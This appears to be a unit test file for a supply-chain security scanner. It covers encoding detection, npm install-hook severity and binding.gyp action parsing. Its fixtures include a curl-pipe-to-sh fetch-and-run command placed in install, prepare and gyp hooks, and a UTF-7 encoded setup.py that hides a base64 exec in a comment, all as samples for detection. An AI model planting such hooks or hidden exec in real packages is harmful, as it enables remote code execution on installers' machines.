"""Review findings 1, 3, 8 and 13 at the scanner-core level (shared by the
registry, the MCP server and project scans).

- looks_binary: only invalid UTF-8 and control bytes count as non-text (an
  accented description or a NUL in a comment made files "binary", never
  scanned).
- decode_source: BOM / UTF-16 / PEP 263 cookies (UTF-7 -> SC-UTF7) and
  SC-TRUNCATED for content that is not text at all.
- Manifests (shared semantics 3): BOM stripped, JavaScript-like number
  parsing, SC-MANIFEST-UNPARSEABLE for an unreadable ROOT manifest, the
  prepare-family hooks (INFO in a project checkout unless suspicious),
  binding.gyp as a Python literal with actions/expansions anywhere.
- hook_script_targets: shell-like tokenization of hook commands.
"""

import json
import os
import tempfile
import unittest

from lazaret.mcp import server as mcp_server
from lazaret.scanner import core as lazaret
from tests.registry._review_support import DECODE_EXEC_JS, ELF, hooks

PAD = "é" * 800                          # 1600 valid non-ASCII bytes
UTF7_SETUP = ("# -*- coding: utf-7 -*-\n"
              "#+AAo-import base64+ADs-exec(base64.b64decode(+ACc-cHJpbnQoMSk=+ACc-))\n")
CURL = "curl -s http://192.0.2.1/x | sh"


def hook_sevs(found):
    return {i["msg"].split('"')[1]: i["sev"] for i in found if i["rule"] == "SC-INSTALL-HOOK"}


class LooksBinaryTests(unittest.TestCase):
    def test_valid_utf8_is_text_however_much_of_it(self):
        self.assertFalse(lazaret.looks_binary(PAD.encode()))
        self.assertFalse(lazaret.looks_binary(("// " + "日本語のコメント" * 100).encode()))

    def test_a_nul_in_a_comment_is_not_binary(self):
        self.assertFalse(lazaret.looks_binary(b"/*\x00*/" + DECODE_EXEC_JS.encode()))

    def test_real_binaries_still_are(self):
        self.assertTrue(lazaret.looks_binary(ELF + bytes(range(256)) * 4))
        self.assertTrue(lazaret.looks_binary(b"MZ" + b"\x00" * 300))
        self.assertTrue(lazaret.looks_binary(bytes((i * 7919) % 256 for i in range(4096))))
        self.assertFalse(lazaret.looks_binary(b""))


class DecodeSourceTests(unittest.TestCase):
    def test_plain_utf8_has_no_extra_issues(self):
        text, extra = lazaret.decode_source("a.py", b"x = 1\n")
        self.assertEqual((text, extra), ("x = 1\n", []))

    def test_utf7_cookie_is_decoded_and_flagged(self):
        text, extra = lazaret.decode_source("setup.py", UTF7_SETUP.encode())
        self.assertIn("\nimport base64;exec(base64.b64decode('cHJpbnQoMSk='))", text)
        by_rule = {i["rule"]: i for i in extra}
        self.assertEqual(by_rule["SC-UTF7"]["sev"], "CRITICAL")
        self.assertEqual(by_rule["SC-UTF7"]["msg"],
                         "Python source declares UTF-7; code can hide in comments.")
        self.assertEqual(by_rule["Q-ENCODING"]["sev"], "INFO")

    def test_utf7_aliases(self):
        for name in ("utf7", "UTF_7", "u7", "unicode-1-1-utf-7"):
            with self.subTest(codec=name):
                _text, extra = lazaret.decode_source("a.py", f"# coding: {name}\nx = 1\n".encode())
                self.assertIn("SC-UTF7", {i["rule"] for i in extra})

    def test_cookie_on_line_two_only_after_a_comment_line(self):
        _t, extra = lazaret.decode_source("a.py", b"#!/usr/bin/env python\n# coding: utf-7\n")
        self.assertIn("SC-UTF7", {i["rule"] for i in extra})
        # CPython ignores a line-2 cookie after a code line; so do we
        _t, extra = lazaret.decode_source("a.py", b"x = 1\n# coding: utf-7\n")
        self.assertEqual(extra, [])

    def test_other_codecs_and_unknown_codecs(self):
        text, extra = lazaret.decode_source("a.py", "# coding: latin-1\nx = 'é'\n".encode("latin-1"))
        self.assertIn("x = 'é'", text)
        self.assertEqual([i["rule"] for i in extra], ["Q-ENCODING"])
        text, extra = lazaret.decode_source("a.py", b"# coding: no-such-codec\nx = 1\n")
        self.assertIn("x = 1", text)
        self.assertEqual([i["rule"] for i in extra], ["Q-ENCODING"])
        # a bytes-to-bytes "codec" is not usable: read as UTF-8, never crash
        text, extra = lazaret.decode_source("a.py", b"# coding: rot13\nx = 1\n")
        self.assertIn("x = 1", text)

    def test_cookie_only_applies_to_python(self):
        _t, extra = lazaret.decode_source("a.js", b"// coding: utf-7\nx = 1\n")
        self.assertEqual(extra, [])

    def test_boms_and_utf16(self):
        text, extra = lazaret.decode_source("a.js", b"\xef\xbb\xbfeval(x)")
        self.assertEqual(text, "eval(x)")
        self.assertEqual([i["rule"] for i in extra], ["Q-ENCODING"])
        text, _ = lazaret.decode_source("a.py", "eval(x)\n".encode("utf-16"))
        self.assertEqual(text, "eval(x)\n")
        text, _ = lazaret.decode_source("a.py", "eval(x)\n".encode("utf-16-le"))
        self.assertEqual(text, "eval(x)\n")

    def test_nul_near_the_top_does_not_flip_utf8_to_utf16(self):
        text, extra = lazaret.decode_source("a.js", b"/*\x00*/" + DECODE_EXEC_JS.encode())
        self.assertIn("eval(Buffer.from", text)
        self.assertEqual(extra, [])

    def test_binary_content_is_a_truncation(self):
        _t, extra = lazaret.decode_source("index.js", ELF + bytes(range(256)) * 8)
        self.assertEqual([i["rule"] for i in extra], ["SC-TRUNCATED"])

    def test_mpeg_ts_video_named_ts_is_not_a_truncation(self):
        ts = bytes([0x47] + [0x11] * 187) * 4
        _t, extra = lazaret.decode_source("clip.ts", ts)
        self.assertEqual(extra, [])


class ManifestParsingTests(unittest.TestCase):
    def test_bom_is_stripped(self):
        found = lazaret.scan_manifest("package.json", "﻿" + hooks(install=CURL))
        self.assertEqual(hook_sevs(found), {"install": "CRITICAL"})

    def test_huge_integer_parses_like_javascript(self):
        text = '{"version": ' + "9" * 5000 + ', "scripts": {"install": "' + CURL + '"}}'
        found = lazaret.scan_manifest("package.json", text)       # used to raise ValueError
        self.assertEqual(hook_sevs(found), {"install": "CRITICAL"})

    def test_unparseable_root_manifest_is_a_finding(self):
        for text in ('{"scripts": {', "[1, 2]", "", "﻿{", "null"):
            with self.subTest(text=text):
                found = lazaret.scan_manifest("package.json", text)
                self.assertEqual([i["rule"] for i in found], ["SC-MANIFEST-UNPARSEABLE"])
                self.assertEqual(found[0]["sev"], "MAJOR")
                self.assertEqual(found[0]["type"], "HOTSPOT")

    def test_unparseable_nested_manifest_is_not(self):
        self.assertEqual(lazaret.scan_manifest("test/fixtures/package.json", "{"), [])
        self.assertEqual(lazaret.scan_manifest("node_modules/x/package.json", "{", registry=True), [])

    def test_deep_nesting_is_still_the_depth_finding(self):
        found = lazaret.scan_manifest("package.json", "[" * 120_000)
        self.assertIn(found[0]["rule"], ("SC-MANIFEST-DEPTH", "SC-MANIFEST-UNPARSEABLE"))

    def test_json_loads_manifest_wrapper_kept(self):
        data, depth = lazaret._json_loads_manifest("package.json", "﻿{\"a\": 1}")
        self.assertEqual((data, depth), ({"a": 1}, None))


class HookListTests(unittest.TestCase):
    MANIFEST = hooks(preinstall="node a.js", install="node b.js", postinstall="node c.js",
                     preprepare="husky install", prepare="patch-package",
                     postprepare=CURL, prepack="node d.js", prepublishOnly="node e.js")

    def test_hook_lists(self):
        self.assertEqual(lazaret.NPM_LOCAL_INSTALL_SCRIPTS,
                         ("preinstall", "install", "postinstall", "preprepare", "prepare", "postprepare"))
        self.assertEqual(lazaret.NPM_INSTALL_SCRIPTS, ("preinstall", "install", "postinstall"))

    def test_project_mode_prepare_family(self):
        sevs = hook_sevs(lazaret.scan_manifest("package.json", self.MANIFEST))
        self.assertEqual(sevs, {"preinstall": "MAJOR", "install": "MAJOR", "postinstall": "MAJOR",
                                "preprepare": "INFO", "prepare": "INFO", "postprepare": "CRITICAL"})

    def test_registry_and_dependency_mode_only_consumer_hooks(self):
        sevs = hook_sevs(lazaret.scan_manifest("package.json", self.MANIFEST, registry=True))
        self.assertEqual(set(sevs), {"preinstall", "install", "postinstall"})

    def test_info_prepare_hook_does_not_fail_the_gate(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "package.json"), "w", encoding="utf-8") as fh:
                fh.write(hooks(prepare="husky install", postprepare="patch-package"))
            with open(os.path.join(d, "index.js"), "w", encoding="utf-8") as fh:
                fh.write("module.exports = 1;\n")
            res = mcp_server.run_project_scan(d)
        cond = {c["label"]: c["ok"] for c in res["conditions"]}
        self.assertTrue(cond["No supply-chain indicators"], res["issues"])
        self.assertEqual({i["sev"] for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"}, {"INFO"})

    def test_suspicious_prepare_fails_the_gate(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "package.json"), "w", encoding="utf-8") as fh:
                fh.write(hooks(prepare=CURL))
            res = mcp_server.run_project_scan(d)
        self.assertFalse(res["pass"])


class GypTests(unittest.TestCase):
    PY_LITERAL = """# gyp files are Python literals
{
  'targets': [{
    'target_name': 'x',
    'include_dirs': ["<!(node -p \\"require('node-addon-api').include\\")"],
    'conditions': [['OS=="linux"', {
      'actions': [{'action_name': 'a', 'inputs': [], 'outputs': ['o'],
                   'action': ['sh', '-c', 'curl -s http://192.0.2.1/x | sh']}],
    }]],
  }],
}
"""

    def test_python_literal_and_nested_actions(self):
        found = lazaret.scan_gyp("binding.gyp", self.PY_LITERAL)
        self.assertEqual([(i["rule"], i["sev"]) for i in found], [("SC-INSTALL-HOOK", "CRITICAL")])

    def test_command_expansions(self):
        gyp = json.dumps({"targets": [{"target_name": "x", "include_dirs": [
            "<!(node -e \"require('nan')\")", "<!@(pkg-config --cflags gtk)"],
            "libraries": ["<!(curl -s http://192.0.2.1/x | sh)"]}]})
        found = lazaret.scan_gyp("binding.gyp", gyp)
        self.assertEqual(len(found), 1)
        self.assertEqual(found[0]["sev"], "CRITICAL")
        self.assertIn("curl", found[0]["cmd"])

    def test_bom_and_unparseable_root(self):
        gyp = "﻿" + json.dumps({"targets": [{"actions": [{"action": ["sh", "-c", CURL]}]}]})
        self.assertEqual(lazaret.scan_gyp("binding.gyp", gyp)[0]["sev"], "CRITICAL")
        self.assertEqual([i["rule"] for i in lazaret.scan_gyp("binding.gyp", "{'targets': [")],
                         ["SC-MANIFEST-UNPARSEABLE"])
        self.assertEqual(lazaret.scan_gyp("deps/x/x.gyp", "{'targets': ["), [])


class HookScriptTargetsTests(unittest.TestCase):
    def test_hook_script_targets(self):
        self.assertEqual(lazaret.hook_script_targets("cd scripts && node x.js"), ["scripts/x.js"])
        self.assertEqual(lazaret.hook_script_targets("node --no-warnings install.js"), ["install.js"])
        self.assertEqual(lazaret.hook_script_targets("node install"), ["install"])
        self.assertEqual(lazaret.hook_script_targets("sh ./install.sh"), ["./install.sh"])
        self.assertEqual(lazaret.hook_script_targets("./install.sh"), ["./install.sh"])
        self.assertIn("scripts/x.js", lazaret.hook_script_targets("node scripts\\x.js"))
        self.assertEqual(lazaret.hook_script_targets("husky install"), [])
        self.assertEqual(lazaret.hook_script_targets('bash -c "node b.js"'), ["b.js"])
        self.assertEqual(lazaret.hook_script_targets("prebuild-install || node-gyp rebuild"), [])


if __name__ == "__main__":
    unittest.main()
